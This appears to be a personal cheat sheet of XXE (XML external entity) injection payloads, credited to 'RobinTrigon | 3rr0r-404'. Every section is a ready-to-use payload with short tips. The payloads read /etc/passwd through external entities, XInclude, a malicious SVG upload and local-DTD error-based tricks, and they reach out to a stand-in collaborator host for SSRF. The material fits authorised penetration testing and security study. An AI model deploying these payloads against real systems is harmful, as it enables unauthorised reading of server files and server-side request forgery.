# My xxe payload
writen by: RobinTrigon | 3rr0r-404
-----------------------------------------------------------------------------------------------------------------------------------------------------------
### Exploiting XXE using external entities to retrieve files
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
### if 1st was fail
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]> //dont call xxe
```
### XXE to perform SSRF attacks
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://sarver-ip/"> ]>
```
### XXE TO SSRF
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://colabrator/"> ]>

```
### Entities are not allowed
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://colabrator/"> ]>

```
### Entities are not allowed
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collabrator"> %xxe; ]> //dont call xxe

```
### must try
```
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY sp SYSTEM "https://collabretor/">]><r>&xxe;&sp;</r>
```

### Peram Based
#### Just replace any peramiter with it and egrep "root:x|daemon:x"
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
### file upload
#### save this as  svg file and upload it. now check your uploaded picture with root:x content.
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
### brutforceing dtd
#### bruteforce "bruteforce-here" with your dtd list and grep  root:x | daemon:x
```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file://bruteforce-here">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
